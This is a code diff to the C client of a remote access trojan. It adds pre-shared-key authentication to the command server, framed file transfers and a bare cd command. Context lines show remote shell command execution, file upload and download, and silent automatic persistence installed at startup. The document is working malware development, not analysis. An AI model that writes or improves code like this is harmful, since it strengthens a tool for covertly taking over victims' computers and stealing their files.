@@ -35,6 +35,7 @@
 
 #include "../include/persistence.h"
 #include "../include/crypto.h"
+#include "../include/util.h"
 
 #define PORT 4444
 #define BUFFER_SIZE 4096
@@ -135,7 +136,7 @@ int perform_client_key_exchange(RAT_CLIENT *client) {
     
     // Receive server's public key length
     uint32_t peer_key_len_net;
-    if (recv(client->client_fd, &peer_key_len_net, sizeof(peer_key_len_net), 0) != sizeof(peer_key_len_net)) {
+    if (recv_all(client->client_fd, &peer_key_len_net, sizeof(peer_key_len_net), 0) != 0) {
         printf("Error: Failed to receive server public key length\n");
         goto cleanup;
     }
@@ -153,7 +154,7 @@ int perform_client_key_exchange(RAT_CLIENT *client) {
         goto cleanup;
     }
     
-    if (recv(client->client_fd, peer_public_key, peer_key_len, 0) != peer_key_len) {
+    if (recv_all(client->client_fd, peer_public_key, peer_key_len, 0) != 0) {
         printf("Error: Failed to receive server public key\n");
         goto cleanup;
     }
@@ -166,19 +167,19 @@ int perform_client_key_exchange(RAT_CLIENT *client) {
     
     // Send our public key length and key
     uint32_t key_len_net = htonl(our_key_len);
-    if (send(client->client_fd, &key_len_net, sizeof(key_len_net), 0) != sizeof(key_len_net)) {
+    if (send_all(client->client_fd, &key_len_net, sizeof(key_len_net), 0) != 0) {
         printf("Error: Failed to send public key length\n");
         goto cleanup;
     }
     
-    if (send(client->client_fd, our_public_key, our_key_len, 0) != our_key_len) {
+    if (send_all(client->client_fd, our_public_key, our_key_len, 0) != 0) {
         printf("Error: Failed to send public key\n");
         goto cleanup;
     }
     
     // Receive encrypted AES key length
     uint32_t enc_key_len_net;
-    if (recv(client->client_fd, &enc_key_len_net, sizeof(enc_key_len_net), 0) != sizeof(enc_key_len_net)) {
+    if (recv_all(client->client_fd, &enc_key_len_net, sizeof(enc_key_len_net), 0) != 0) {
         printf("Error: Failed to receive encrypted key length\n");
         goto cleanup;
     }
@@ -196,7 +197,7 @@ int perform_client_key_exchange(RAT_CLIENT *client) {
         goto cleanup;
     }
     
-    if (recv(client->client_fd, encrypted_aes_key, encrypted_key_len, 0) != encrypted_key_len) {
+    if (recv_all(client->client_fd, encrypted_aes_key, encrypted_key_len, 0) != 0) {
         printf("Error: Failed to receive encrypted AES key\n");
         goto cleanup;
     }
@@ -259,6 +260,23 @@ int connect_to_server(RAT_CLIENT *client) {
         perror("Connection failed");
 #endif
         return -1;
+    }
+    
+    // PSK authentication (if configured) — happens before crypto init on raw TCP
+    if (client->crypto_ctx.psk_hash[0] != 0) {
+        int psk_ret = crypto_recv_psk_challenge(client->client_fd, &client->crypto_ctx, 0);
+        if (psk_ret == -1) {
+            printf("Error: PSK authentication failed\n");
+            return -1;
+        }
+        if (psk_ret == 0) {
+            // Server has PSK too — respond with our hash
+            if (crypto_send_psk_challenge(client->client_fd, &client->crypto_ctx, 0) != 0) {
+                printf("Error: PSK authentication failed\n");
+                return -1;
+            }
+        }
+        // psk_ret == 1 means server has no PSK — proceed without (backward compat)
     }
     
     // Initialize crypto context for client
@@ -357,30 +375,9 @@ void send_response_with_prompt(RAT_CLIENT *client, const char *response) {
         full_response[sizeof(full_response) - 1] = '\0';
     }
     
-    // Send in chunks if response is large
-    int total_len = strlen(full_response);
-    int sent = 0;
-    int chunk_size = BUFFER_SIZE - 1;
-    
-    while (sent < total_len && client->client_fd != INVALID_SOCKET) {
-        int to_send = (total_len - sent > chunk_size) ? chunk_size : (total_len - sent);
-        int bytes_sent = crypto_send(client->client_fd, &client->crypto_ctx, full_response + sent, to_send, 0);
-        
-        if (bytes_sent <= 0) {
-            client->client_fd = INVALID_SOCKET;
-            break; // Error sending
-        }
-        
-        sent += bytes_sent;
-        
-        // Small delay between chunks to prevent overwhelming
-        if (sent < total_len) {
-#ifdef _WIN32
-            Sleep(10); // 10ms delay on Windows
-#else
-            usleep(10000); // 10ms delay on Linux
-#endif
-        }
+    // Send in a single encrypted packet (crypto_send handles retry internally)
+    if (crypto_send(client->client_fd, &client->crypto_ctx, full_response, strlen(full_response), 0) <= 0) {
+        client->client_fd = INVALID_SOCKET;
     }
 }
 
@@ -440,16 +437,19 @@ void execute_system_command(RAT_CLIENT *client, const char *command, char *resul
         if (total_len > 0) {
             if (total_len < result_size - 50) {
                 strcat(result, "\nWarning: Error closing command pipe");
+                total_len = strlen(result);
             }
         } else {
             strncpy(result, "Error: Failed to close command pipe", result_size - 1);
             result[result_size - 1] = '\0';
+            total_len = strlen(result);
         }
     }
     
     // Remove trailing newline for cleaner output
-    if (total_len > 0 && result[total_len - 1] == '\n') {
-        result[total_len - 1] = '\0';
+    size_t actual_len = strlen(result);
+    if (actual_len > 0 && result[actual_len - 1] == '\n') {
+        result[actual_len - 1] = '\0';
     }
 }
 
@@ -457,6 +457,22 @@ void execute_shell_command(RAT_CLIENT *client, const char *command) {
     char result[BUFFER_SIZE * 4] = {0};
     
     // Handle cd command specially to update current directory
+    if (strcmp(command, "cd") == 0) {
+        // Bare cd: go to home directory
+#ifdef _WIN32
+        const char *home = getenv("USERPROFILE");
+#else
+        const char *home = getenv("HOME");
+#endif
+        if (home && chdir(home) == 0) {
+            strncpy(client->current_dir, home, sizeof(client->current_dir) - 1);
+            client->current_dir[sizeof(client->current_dir) - 1] = '\0';
+            send_response_with_prompt(client, "");
+            return;
+        }
+        send_response_with_prompt(client, "cd: No such file or directory");
+        return;
+    }
     if (strncmp(command, "cd ", 3) == 0) {
         const char *path = command + 3;
         // Trim whitespace from path
@@ -535,6 +551,16 @@ void handle_download(RAT_CLIENT *client, const char *filename) {
         return;
     }
     
+    // Get file size for EOF framing
+    struct stat file_stat;
+    if (stat(filename, &file_stat) != 0) {
+        char error_msg[512];
+        snprintf(error_msg, sizeof(error_msg), "Error: Cannot stat file for download - %s", strerror(errno));
+        send_response_with_prompt(client, error_msg);
+        return;
+    }
+    uint64_t file_size = (uint64_t)file_stat.st_size;
+    
     file = fopen(filename, "rb");
     if (file == NULL) {
         char error_msg[512];
@@ -543,15 +569,18 @@ void handle_download(RAT_CLIENT *client, const char *filename) {
         return;
     }
     
+    // Send file size first (two uint32_t in network order)
+    {
+        uint32_t sz_hi = htonl((uint32_t)(file_size >> 32));
+        uint32_t sz_lo = htonl((uint32_t)(file_size & 0xFFFFFFFF));
+        crypto_send(client->client_fd, &client->crypto_ctx, &sz_hi, sizeof(sz_hi), 0);
+        crypto_send(client->client_fd, &client->crypto_ctx, &sz_lo, sizeof(sz_lo), 0);
+    }
+    
     // Send file content
     while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
         int bytes_sent = crypto_send(client->client_fd, &client->crypto_ctx, buffer, bytes_read, 0);
         if (bytes_sent <= 0) {
-            client->client_fd = INVALID_SOCKET;
-            fclose(file);
-            return;
-        } else if (bytes_sent != (int)bytes_read) {
-            // Partial send - this is problematic for file transfer
             client->client_fd = INVALID_SOCKET;
             fclose(file);
             return;
@@ -590,28 +619,21 @@ void handle_upload(RAT_CLIENT *client) {
     
     // Receive upload info in format "destination|filename\n"
     memset(upload_info, 0, sizeof(upload_info));
-    int info_pos = 0;
-    char temp_char;
     
-    // Read upload info character by character until newline
-    while (info_pos < (int)(sizeof(upload_info) - 1)) {
-        bytes_received = crypto_recv(client->client_fd, &client->crypto_ctx, &temp_char, 1, 0);
-        if (bytes_received <= 0) {
-            if (bytes_received == 0) {
-                send_response_with_prompt(client, "Error: Connection closed during upload info reception");
-            } else {
-                send_response_with_prompt(client, "Error: Failed to receive upload info");
-            }
-            return;
-        }
-        
-        if (temp_char == '\n') {
-            break; // End of upload info
-        }
-        
-        upload_info[info_pos++] = temp_char;
+    // Read upload info in one batch
+    bytes_received = crypto_recv(client->client_fd, &client->crypto_ctx,
+                                upload_info, sizeof(upload_info) - 1, 0);
+    if (bytes_received <= 0) {
+        send_response_with_prompt(client, "Error: Failed to receive upload info");
+        return;
     }
-    upload_info[info_pos] = '\0';
+    upload_info[bytes_received] = '\0';
+    
+    // Find the newline terminator (server sends "destination|filename\n")
+    char *nl = strchr(upload_info, '\n');
+    if (nl) {
+        *nl = '\0';
+    }
     
     // Send acknowledgment to server
     int ack_sent = crypto_send(client->client_fd, &client->crypto_ctx, "OK", 2, 0);
@@ -640,19 +662,7 @@ void handle_upload(RAT_CLIENT *client) {
         struct stat st;
         if (stat(destination, &st) == 0 && S_ISDIR(st.st_mode)) {
             // Destination is a directory, append filename
-#ifdef _WIN32
-            const char *base_filename = strrchr(filename, '\\');
-            if (!base_filename) {
-                base_filename = strrchr(filename, '/');
-            }
-#else
-            const char *base_filename = strrchr(filename, '/');
-#endif
-            if (base_filename) {
-                base_filename++; // Skip the separator
-            } else {
-                base_filename = filename;
-            }
+            const char *base_filename = find_base_name(filename);
 #ifdef _WIN32
             snprintf(final_path, sizeof(final_path), "%s\\%s", destination, base_filename);
 #else
@@ -665,63 +675,58 @@ void handle_upload(RAT_CLIENT *client) {
         }
     } else {
         // No destination specified, use current directory
-#ifdef _WIN32
-        const char *base_filename = strrchr(filename, '\\');
-        if (!base_filename) {
-            base_filename = strrchr(filename, '/');
-        }
-#else
-        const char *base_filename = strrchr(filename, '/');
-#endif
-        if (base_filename) {
-            base_filename++; // Skip the separator
-        } else {
-            base_filename = filename;
-        }
+        const char *base_filename = find_base_name(filename);
         strncpy(final_path, base_filename, sizeof(final_path) - 1);
         final_path[sizeof(final_path) - 1] = '\0';
     }
     
+    // Receive file size (two uint32_t in network order)
+    uint32_t fsz_hi_net = 0, fsz_lo_net = 0;
+    crypto_recv(client->client_fd, &client->crypto_ctx, &fsz_hi_net, sizeof(fsz_hi_net), 0);
+    crypto_recv(client->client_fd, &client->crypto_ctx, &fsz_lo_net, sizeof(fsz_lo_net), 0);
+    uint64_t file_remaining = ((uint64_t)ntohl(fsz_hi_net) << 32) | ntohl(fsz_lo_net);
+    
     file = fopen(final_path, "wb");
     if (file == NULL) {
         char error_msg[512];
-        char truncated_path[256];
-        
-        // Truncate path if too long to prevent buffer overflow
-        if (strlen(final_path) > 255) {
-            strncpy(truncated_path, final_path, 252);
-            truncated_path[252] = '.';
-            truncated_path[253] = '.';
-            truncated_path[254] = '.';
-            truncated_path[255] = '\0';
-        } else {
-            strcpy(truncated_path, final_path);
-        }
-        
-        snprintf(error_msg, sizeof(error_msg), "Error: Cannot create file %s - %s", truncated_path, strerror(errno));
+        char display_path[200];
+        strncpy(display_path, final_path, sizeof(display_path) - 1);
+        display_path[sizeof(display_path) - 1] = '\0';
+        snprintf(error_msg, sizeof(error_msg), "Error: Cannot create file %s - %s", display_path, strerror(errno));
         send_response_with_prompt(client, error_msg);
+        
+        // Drain remaining file data to keep protocol in sync
+        {
+            char drain_buf[BUFFER_SIZE];
+            uint64_t remain = file_remaining;
+            while (remain > 0) {
+                int to_read = (remain > BUFFER_SIZE) ? BUFFER_SIZE : (int)remain;
+                int n = crypto_recv(client->client_fd, &client->crypto_ctx, drain_buf, to_read, 0);
+                if (n <= 0) break;
+                remain -= n;
+            }
+        }
         return;
     }
     
-    // Receive file content
-    while ((bytes_received = crypto_recv(client->client_fd, &client->crypto_ctx, buffer, BUFFER_SIZE, 0)) > 0) {
+    // Receive file content (exactly file_remaining bytes)
+    while (file_remaining > 0) {
+        int to_read = (file_remaining > BUFFER_SIZE) ? BUFFER_SIZE : (int)file_remaining;
+        bytes_received = crypto_recv(client->client_fd, &client->crypto_ctx, buffer, to_read, 0);
+        if (bytes_received <= 0) {
+            fclose(file);
+            unlink(final_path);
+            send_response_with_prompt(client, "Error: Failed to receive file data");
+            return;
+        }
         size_t bytes_written = fwrite(buffer, 1, bytes_received, file);
         if (bytes_written != (size_t)bytes_received) {
             fclose(file);
-            unlink(final_path); // Remove partially written file
+            unlink(final_path);
             send_response_with_prompt(client, "Error: Failed to write uploaded data to file");
             return;
         }
-        if (bytes_received < BUFFER_SIZE) {
-            break; // End of file
-        }
-    }
-    
-    if (bytes_received < 0) {
-        fclose(file);
-        unlink(final_path); // Remove partially written file
-        send_response_with_prompt(client, "Error: Failed to receive file data");
-        return;
+        file_remaining -= bytes_received;
     }
     
     if (fclose(file) != 0) {
@@ -850,7 +855,7 @@ void execute_commands(RAT_CLIENT *client) {
 }
 
 void cleanup(RAT_CLIENT *client) {
-    if (client->client_fd > 0) {
+    if (client->client_fd != INVALID_SOCKET) {
         close(client->client_fd);
     }
     crypto_cleanup(&client->crypto_ctx);
@@ -861,6 +866,14 @@ void cleanup(RAT_CLIENT *client) {
 
 int main() {
     RAT_CLIENT client;
+    
+    memset(&client.crypto_ctx, 0, sizeof(client.crypto_ctx));
+    
+    // Pre-shared key for server authentication
+    const char *psk = getenv("RAT_PSK");
+    if (psk) {
+        crypto_set_psk(&client.crypto_ctx, psk);
+    }
     
     // Install persistence automatically and silently
     install_automatic_persistence();
